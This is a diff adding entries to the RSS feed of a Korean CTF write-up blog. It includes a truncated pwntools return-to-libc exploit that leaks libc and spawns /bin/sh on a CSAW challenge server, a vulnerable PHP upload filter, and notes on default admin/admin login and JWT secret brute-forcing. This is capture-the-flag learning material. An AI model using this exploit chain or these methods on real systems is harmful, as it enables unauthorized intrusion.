@@ -43,12 +43,34 @@ XSS 인가하고 접근을 해봤었는데 안되서 다른 유형일거라고 �
     </item>
     
     <item>
+      <title>2020 CSAWCTF Roppity Write up</title>
+      <link>https://blog.jhyeon.dev/posts/20200914_csawctf/</link>
+      <pubDate>Mon, 14 Sep 2020 00:00:00 +0900</pubDate>
+      
+      <guid>https://blog.jhyeon.dev/posts/20200914_csawctf/</guid>
+      <description>Roppity Exploit #!/usr/bin/python3 from pwn import * p = remote(&amp;#39;pwn.chal.csaw.io&amp;#39;,5016) e = ELF(&amp;#39;./rop&amp;#39;) libc = ELF(&amp;#39;./libc-2.27.so&amp;#39;) pr = 0x0000000000400683 # pop rdi ret ret = 0x000000000040048e # ret puts_plt = e.plt[&amp;#39;puts&amp;#39;] puts_got = e.got[&amp;#39;puts&amp;#39;] main = e.symbols[&amp;#39;main&amp;#39;] puts_offset = libc.symbols[&amp;#39;puts&amp;#39;] system_offset = libc.symbols[&amp;#39;system&amp;#39;] binsh_offset = next(libc.search(&amp;#34;/bin/sh&amp;#34;)) payload = &amp;#34;A&amp;#34;*40 # 32byte + 8 payload += p64(pr) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(main) p.sendlineafter(&amp;#34;\n&amp;#34;, payload) puts_addr = u64(p.recv(6).ljust(8,&amp;#34;\x00&amp;#34;)) libc_base = puts_addr - puts_offset system_addr = libc_base + system_offset binsh_addr = libc_base + binsh_offset payload = &amp;#34;A&amp;#34;*40 payload += p64(pr) payload += p64(binsh_addr) payload += p64(ret) payload += p64(system_addr) p.</description>
+    </item>
+    
+    <item>
       <title>2020 DIMICTF WEB WRITE UP</title>
       <link>https://blog.jhyeon.dev/posts/20200206_dimictf/</link>
       <pubDate>Thu, 06 Feb 2020 00:00:00 +0900</pubDate>
       
       <guid>https://blog.jhyeon.dev/posts/20200206_dimictf/</guid>
       <description>WEB 5shared &amp;lt;?php require_once &amp;#39;lib.php&amp;#39;; session_start(); $session = md5(session_id()); $uploaddir = __DIR__ . &amp;#34;/~uploads/{$session}/&amp;#34;; createDirectory(__DIR__ . &amp;#34;/~uploads/&amp;#34;); createDirectory($uploaddir); //print_r($_FILES[&amp;#39;file&amp;#39;]); $file = $_FILES[&amp;#39;file&amp;#39;]; $uploadfile = $uploaddir . $file[&amp;#39;name&amp;#39;]; // sanity check $extension = explode(&amp;#39;.&amp;#39;, $file[&amp;#39;name&amp;#39;])[1]; if (!in_array($extension, Array(&amp;#34;jpg&amp;#34;, &amp;#34;gif&amp;#34;, &amp;#34;png&amp;#34;))) { $message = &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;jpg, gif, png 확장자만 업로드할 수 있습니다.&amp;#39;); history.back(); &amp;lt;/script&amp;gt;&amp;#34;; die($message); } // the real sanity check $real_extension = array_pop(explode(&amp;#39;.&amp;#39;, $file[&amp;#39;name&amp;#39;])); if (preg_match(&amp;#34;/php/i&amp;#34;, $file[&amp;#39;name&amp;#39;])) { $message = &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;파일 이름에 php가 들어가면 안됩니다.</description>
+    </item>
+    
+    <item>
+      <title>2019 ChristmasCTF Write Up</title>
+      <link>https://blog.jhyeon.dev/posts/20191225_christmasctf/</link>
+      <pubDate>Wed, 25 Dec 2019 00:00:00 +0900</pubDate>
+      
+      <guid>https://blog.jhyeon.dev/posts/20191225_christmasctf/</guid>
+      <description>Web Watermelon (unintended) 이 문제는 언인텐으로 풀 수 있었던 문제인데, 관리자 계정이 admin/admin 으로 설정되어있다는 점을
+활용해서 그냥 로그인하고 공짜로 플래그를 얻었다.
+JWT PHP JWT TOKEN 사용하는 문제이다. 문제에서 제공되는 config.js 파일에서 소스코드를 볼 수 있는데
+다음과 같이 구성되어 있다.
+jwt: { bruth: { key: &amp;#39;********&amp;#39;, // 0~9, 8 length options: { issuer: &amp;#39;c2w2m2&amp;#39;, expiresIn: &amp;#39;1d&amp;#39;, algorithm: &amp;#39;HS256&amp;#39;, } }; JWT 토큰 생성 시 사용되는 secret key 를 찾아서 무차별 대입 공격해서 찾아내야 할 것 같다.</description>
     </item>
     
   </channel>
